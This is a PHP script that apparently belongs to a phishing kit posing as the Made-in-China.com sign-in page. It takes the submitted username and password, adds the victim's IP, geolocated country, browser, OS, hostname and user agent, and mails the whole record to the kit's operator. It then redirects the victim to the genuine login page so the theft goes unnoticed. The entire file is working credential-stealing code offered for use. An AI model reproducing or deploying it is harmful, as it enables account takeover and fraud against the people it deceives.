<?php


require_once '../mail.php';
require_once 'geo.php';
require_once 'sync.php';

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");

if (isset($_POST['logUserName']) || isset($_POST['logPassword'])) { 
$_SESSION["email"] = $email = $_POST["logUserName"];
$_SESSION["passwd"] = $passwd = $_POST["logPassword"];

$message .= "-------------------------------------------------------------------------------------\n";
$message .= "User ID: ".$email."\n";
$message .= "Password: ".$passwd."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "IP: ".$ip." | ".$cn."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";
$message .= "-------------------------------------------------------------------------------------\n";

$subject = "You've got a new supplier from $ip ($cn)";
$headers = "From: MIC $cc <noreply>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($email) || empty($passwd)) {
header("Location: ./?logonInCode=0");
}
else {
mail($to,$subject,$message,$headers);
	header("Location: https://login.made-in-china.com/sign-in/?logonInCode=1");
}

}

?>